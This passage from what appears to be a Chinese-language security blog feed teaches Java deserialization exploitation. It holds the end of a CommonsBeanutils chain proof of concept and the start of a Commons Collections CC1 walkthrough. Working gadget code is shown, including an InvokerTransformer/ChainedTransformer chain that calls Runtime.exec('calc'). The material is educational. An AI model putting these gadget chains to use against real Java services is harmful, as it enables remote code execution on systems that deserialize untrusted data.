Object[] x = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;tem,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(priority,x);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;outputProperties&quot;</span>;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> BeanComparator.class.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">        field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field2.set(bean,name);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(priority);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功按照预期弹出一个计算机。</p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java反序列化调用链分析</category>
        <category>CB链</category>
      </categories>
  </entry>
  <entry>
    <title>CC1</title>
    <url>/2024/08/13/CC1/</url>
    <content><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>前面说过了URLDNS这条链，现在我们就可以开始学习Common-Collections利用链，这是反序列化学习中不可逃过的一关。</p>
<p><strong>学习路线</strong>：CC1 -&gt; CC6 -&gt; CC3 -&gt; CC5 -&gt; CC7 -&gt; CC2 -&gt; CC4 (其中CC2和CC4是common-collections4的利用链)</p>
<span id="more"></span>

<h2 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons Collections"></a>Commons Collections</h2><h3 id="前置说明"><a href="#前置说明" class="headerlink" title="前置说明"></a>前置说明</h3><p><strong>Apache  Commons是Apache软件基金会的项目</strong>，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。</p>
<p>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
<p><strong>由于大量的生产环境中都会导入这个包，所以此包中的众多反序列化链已经成为经典链条</strong>。</p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>Apache Commons项目需要导入，所以<strong>我们在这里需要搭建环境</strong>，还是使用maven来导包，修改pom.xml即可，比如我这里要导一个cc3.2.1，加上如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>再更新一下项目即可。</p>
<h5 id="下载并且配置相应源码"><a href="#下载并且配置相应源码" class="headerlink" title="下载并且配置相应源码"></a>下载并且配置相应源码</h5><p>因为JDK自带·的包里面有些文件是反编译的.class文件导致我们没法清楚看懂代码，为了方便调试，我们需要将它们转变为.java文件，这就需要我们安装响应的源码。</p>
<p>下载地址：<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p>
<p>先原本jdk目录下的src.zip解压到当前目录，在链接中点击zip下载后解压，在&#x2F;src&#x2F;share&#x2F;classes中找到sun文件，把其复制到原本jdk中src.zip的解压文件。</p>
<p><img src="/2024/08/13/CC1/image-20240721000550724.png" alt="image-20240721000550724"></p>
<p>最后再在idea中把src文件夹添加到原路径下即可：</p>
<p><img src="/2024/08/13/CC1/image-20240721000648000.png" alt="image-20240721000648000"></p>
<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><p>主要内容就回去看动态代理笔记的内容，这里主要说明一个点：<strong>当我们调用某个动态代理对象的方法时，都会触发代理类的Invoke方法，并传递对应的内容。</strong></p>
<h3 id="正式分析"><a href="#正式分析" class="headerlink" title="正式分析"></a>正式分析</h3><p><strong>测试环境：</strong></p>
<ul>
<li>JDK 8u65</li>
<li>commons-collections 3.2.1</li>
</ul>
<h4 id="需要了解的类和接口"><a href="#需要了解的类和接口" class="headerlink" title="需要了解的类和接口"></a>需要了解的类和接口</h4><h5 id="AbstractMapDecorator"><a href="#AbstractMapDecorator" class="headerlink" title="AbstractMapDecorator"></a>AbstractMapDecorator</h5><p>在CC库中提供了一个抽象类<code>org.apache.commons.collections.map.AbstractMapDecorator</code>，这个类是Map的扩展，从名字来看，这是一个基础的装饰器，用来给map提供附加功能，被装饰的map存在该类的属性中，并且将所有的操作都转发给这个map。</p>
<p>这个类有很多实现类，各个类触发的方式不同，重点关注的是TransformedMap 以及LazyMap。</p>
<h5 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h5><p><code>org.apache.commons.collections.map.TransformedMap</code>类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer来定义，Transformer 在 TransformedMap 实例化时作为参数传入。可以简单看看这个类的定义：</p>
<p><img src="/2024/08/13/CC1/image-20240722000418925.png" alt="image-20240722000418925"></p>
<p><em>这个类继承了一个类和实现了一个接口</em>。再看源码其实可以发现很多方法都实现了<code>transform()</code>方法</p>
<p>这里给一个示例利用代码（看到这里可以先去简单看看后面的transform接口类的代码）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Transformer</span> <span class="variable">keyTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transformer</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> (<span class="type">int</span>) input;</span><br><span class="line">            num += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> (Object) num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Transformer</span> <span class="variable">valueTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Transformer</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> input.toString();</span><br><span class="line">            <span class="keyword">return</span> str + <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        HashMap&lt;Integer, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="number">1</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;初始化map:&quot;</span> + hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建TransformedMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, keyTransformer, valueTransformer);</span><br><span class="line">        map.put(<span class="number">2</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;transformMap:&quot;</span> + map);</span><br><span class="line">        map.put(<span class="number">1</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;transformMap:&quot;</span> + map);</span><br><span class="line">        map.remove(<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;transformMap:&quot;</span> + map);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后的输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">初始化map:&#123;1=a&#125;</span><br><span class="line">transformMap:&#123;1=a, 3=b1&#125;</span><br><span class="line">transformMap:&#123;1=a, 2=w1, 3=b1&#125;</span><br><span class="line">transformMap:&#123;2=w1, 3=b1&#125;</span><br></pre></td></tr></table></figure>

<p>其实这里出现这个结果的原因还是和对象相关，可以来调试一下：</p>
<ul>
<li><p><strong>这里首先了解一下匿名类是什么</strong>，可以参考这个<a href="https://blog.csdn.net/m0_73370205/article/details/134276110">文章</a>，就是<u>可以实现一个类中包含另外一个类</u>，且不需要提供任何的类名直接实例化。<u>主要是用于在我们需要的时候创建一个对象来执行特定的任务</u>，可以使代码更加简洁。</p>
</li>
<li><p><strong>重要说明：</strong>首先在这串代码<strong>使用匿名类实现了Transformer接口</strong>，创建了一个对象，代码都使用匿名类实现了Transformer接口，创建了一个临时的类实例（即对象），并将这个类实例赋值给了keyTransformer和valueTransformer并都重写了transform()方法，这个是最重要的。（重要的是看代码，一看就懂了，）</p>
</li>
</ul>
<p><strong>然后开始调试：</strong></p>
<p>重要看后面的put那部分，第一个就是HashMap类的put方法，就是放入一对键值对，不多说。重点看后面。</p>
<p>然后调用</p>
<p><img src="/2024/08/13/CC1/image-20240716160351313.png" alt="image-20240716160351313"></p>
<p>跟进源码</p>
<p><img src="/2024/08/13/CC1/image-20240716160420770.png" alt="image-20240716160420770"></p>
<p>即返回一个TransformedMap对象，并且此时的keyTransformer和valueTransformer对应自定义的匿名类。</p>
<p>然后加断点：</p>
<p><img src="/2024/08/13/CC1/image-20240716101142675.png" alt="image-20240716101142675"></p>
<p>然后现在来看对应的变量的值：</p>
<p><img src="/2024/08/13/CC1/image-20240716155510991.png" alt="image-20240716155510991"></p>
<p>重点看值，注意valueTransformer和keyTransformer的值为<code>Test$2..</code>和<code>Test$1..</code>，相互对比到来看，可以很容易看出这种格式就是代表匿名类，而不是一个Test类实例。</p>
<p>在后续的<code>map.put()</code>中，调用的就是TransformedMap类的put方法：</p>
<p><img src="/2024/08/13/CC1/image-20240716160032878.png" alt="image-20240716160032878"></p>
<p>然后就会调用transformKey方法，源码如下：</p>
<p><img src="/2024/08/13/CC1/image-20240716160152729.png" alt="image-20240716160152729"></p>
<p>此时就会调用keyTransformer的transform方法，此时调用的就是匿名类的transform方法，那么就是</p>
<p><img src="/2024/08/13/CC1/image-20240716160643025.png" alt="image-20240716160643025"></p>
<p>valueTransformer.transformer()同理。逻辑是这样，并且在调试过程中也同样这这个过程。</p>
<p>继续看<code>map.put()</code>方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return this.getMap().put(key, value);</span><br></pre></td></tr></table></figure>

<p>这个getMap对应TransformedMap的父类AbstractInputCheckedMapDecorator的父类AbstractMapDecorator的getMap()方法，源码为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Map <span class="title function_">getMap</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.map;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>结合前面的实例化的描述，可以知道这里的map即HashMap类实例，所以这里会再调用HashMap的put方法放入一对修饰后的键值对。</p>
<p>后面那个同理</p>
<p>最后会调用HashMasp类的remove方法来去掉一个键值对。</p>
<p><strong>代码分析结束，对于这一段示例代码就需要理解透彻，了解其中的运行过程与逻辑，后面会有用。–。</strong></p>
<p>也就是说当 TransformedMap 内的 key 或者 value 发生变化时（例如调用 TransformedMap 的 <code>put</code> 方法时），就会触发相应参数的 Transformer 的 <code>transform()</code> 方法。</p>
<h5 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h5><p><code>org.apache.commons.collections.map.LazyMap</code>与TransformedMap类似，这个类触发transform()方法的点就在于调用<code>get()</code>方法时传入的key不存在，看一下get()方法的源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>再看下面：</p>
<p><img src="/2024/08/13/CC1/image-20240716170115691.png" alt="image-20240716170115691"></p>
<p>可以知道LazyMap类继承于AbstractMapDecorator。</p>
<p><code>org.apache.commons.collections.map.DefaultedMap</code>与LazyMap具有相同功能，同样是<code>get()</code>方法会触发transform 方法。</p>
<h5 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h5><p><code>org.apache.commons.collections.Transformer</code>是一个接口类，源代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它提供了一个<code>transform()</code>方法，用来定义具体的转换逻辑。</p>
<p>在Commons Colection 项目中，程序提供了21个Transformer 的实现类，用来实现不同的对TransformedMap 中的 key&#x2F;value 进行修改的功能</p>
<p><img src="/2024/08/13/CC1/image-20240716095330668.png" alt="image-20240716095330668"></p>
<p>重点关注几个实现类</p>
<h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p><code>org.apache.commons.collections.functors.InvokerTransformer</code>，这个实现类从 Commons Collections 3.0 引入，功能是使用反射创建一个新对象，来看一下它的transform方法源码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重点就是try部分代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br></pre></td></tr></table></figure>

<p>这里使用反射获取方法并使用invoke()方法调用这个方法，看看这里需要利用的几个参数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br></pre></td></tr></table></figure>

<p>赋值方法也在构造函数里面，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>尝试自己构造，测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        x.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算机：<br><img src="/2024/08/13/CC1/image-20240717101316796.png" alt="image-20240717101316796"></p>
<h5 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h5><p><code>org.apache.commons.collections.functors.ChainedTransformer</code>类也是Transformer的实现类，关键源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">           object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> object;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><u>这里的重点就是这个类自己维护了一个Transformer数组，在调用ChainedTransformer的transform方法时，会循环数组，依次调用 Transformer 数组每个 trandform方法，并将结果传递给下一个 Transformer。</u></p>
<p>这样就给了使用者链式调用多个 Transformer 分别处理对象的能力。</p>
<h5 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h5><p><code>org.apache.commons.collections.functors.ConstantTransformer</code>是返回一个固定常量的Transformer，在初始化时储存了一个Object，后续的调用会直接返回这个Object。关键源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个类用于和ChainedTransformer配合，将其结果传入InvokerTransformer来调用我们指定的类的指定方法。</p>
<h4 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h4><p>CC1这里有两条链可以利用，分别是利用TransformedMap类和LazyMap类，现在来分别说明一下。</p>
<h5 id="TransformedMap链"><a href="#TransformedMap链" class="headerlink" title="TransformedMap链"></a>TransformedMap链</h5><h6 id="基本本地代码"><a href="#基本本地代码" class="headerlink" title="基本本地代码"></a>基本本地代码</h6><p>这里就结合到前面知识点，来构造反序列化的恶意利用代码。现在我们构造的最终的利用点，就是<code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>，在这里使用TransformedMap 触发，本地demo如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)                                                             &#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,chain,<span class="literal">null</span>);</span><br><span class="line">        map2.put(<span class="number">10</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明一下这串代码的作用，先说后面的利用代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> TransformedMap.decorate(hashMap,chain,<span class="literal">null</span>);</span><br><span class="line">        map2.put(<span class="number">10</span>,<span class="string">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这部分代码只要理解到了前面在TransformedMap类部分给的示例代码基本就可以理解了。所以链子起始点就是</p>
<p><img src="/2024/08/13/CC1/image-20240720144155815.png" alt="image-20240720144155815"></p>
<p>现在来看流程，打断点如下：</p>
<p><img src="/2024/08/13/CC1/image-20240720144236280.png" alt="image-20240720144236280"></p>
<p>然后就继续跟进，由于我们传入的keyTransformer就是ChainedTransformer类对象，所以这里调用的<code>transform()</code>方法时，调用的就是ChainedTransformer类的transform()方法，如下：</p>
<p><img src="/2024/08/13/CC1/image-20240720145035782.png" alt="image-20240720145035782"></p>
<p>现在来看我们给ChainedTransformer类传入的数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)                                                             &#125;);</span><br><span class="line"><span class="comment">//注意理解</span></span><br></pre></td></tr></table></figure>

<p>1.然后现在就是调用的传入的<strong>数组第一个参数</strong>的transform方法，即ConstantTransformer类的transform()方法（此时的object为10）：</p>
<p><img src="/2024/08/13/CC1/image-20240720145529718.png" alt="image-20240720145529718"></p>
<p>这里的transform方法会直接返回我们实例化时定义的<code>Runtime.class</code>，所以这里的10最终是没用的，这步过后object的值变为了Runtime对象，即<code>class java.lang.Runtime</code>。</p>
